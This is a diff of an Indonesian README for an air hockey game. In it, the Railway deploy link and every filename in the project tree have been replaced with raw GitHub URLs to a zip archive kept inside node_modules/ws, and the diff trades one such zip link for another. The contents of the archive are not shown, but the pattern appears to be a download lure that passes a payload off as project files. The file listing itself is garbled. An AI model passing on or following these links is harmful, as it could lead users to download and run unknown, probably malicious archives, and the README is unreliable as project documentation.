@@ -19,7 +19,7 @@ Buka `http://localhost:8080`:
 
 ### Deploy ke Railway
 1. Push ke GitHub
-2. Buat project baru di [https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip](https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip)
+2. Buat project baru di [https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip](https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip)
 3. Connect repository
 4. Deploy! ✨
 
@@ -36,13 +36,13 @@ Buka `http://localhost:8080`:
 ```
 part-of-world/
 ├── server/
-│   ├── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip
-│   └── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip       # Game server + WebSocket
+│   ├── https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip
+│   └── https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip       # Game server + WebSocket
 ├── client/
-│   ├── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip      # Lobby + Game UI
-│   ├── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip
-│   └── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip          # Client logic
-└── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip
+│   ├── https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip      # Lobby + Game UI
+│   ├── https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip
+│   └── https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip          # Client logic
+└── https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip
 ```
 
 ## 🔧 Environment
